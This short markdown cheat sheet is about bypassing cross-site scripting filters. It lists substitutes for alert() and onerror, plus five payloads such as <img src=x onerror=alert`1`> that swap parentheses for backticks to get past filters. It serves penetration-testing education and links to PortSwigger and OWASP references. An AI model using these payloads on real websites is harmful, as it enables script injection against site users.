# XSS Filters Bypass.

if You Are a Beginner then First Clear the Basic Concepts .


* ```alert()``` Alternatives
```
   1)Use confirm() Not alert()
   2)Use prompt() Not alert()
   3)Use console.log() Not alert()
   4)use eval() Not alert()
```

* ```onerror``` Event Handler Alternatives
```
   1)Use onload
   2)Use onfocus
   3)Use onmouseover
   4)Use onblur
   5)Use onclick
   6)Use onscroll   
```
* Note:- if () get filtered then Use \`\` Rather then () , Some Examples Are Below.

```
   1)<script>alert`1`</script>
   2)<img src=x onerror=alert`1`>
   3)<img src=x onerror=prompt`1`>
   4)javascript:prompt`1`
   5)javascript:alert`1`
```
## Resources
- 1:-[Portswigger](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- 2:-[OWASP](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)

## Twitter:[Fani Malik](https://twitter.com/fanimalikhack/)
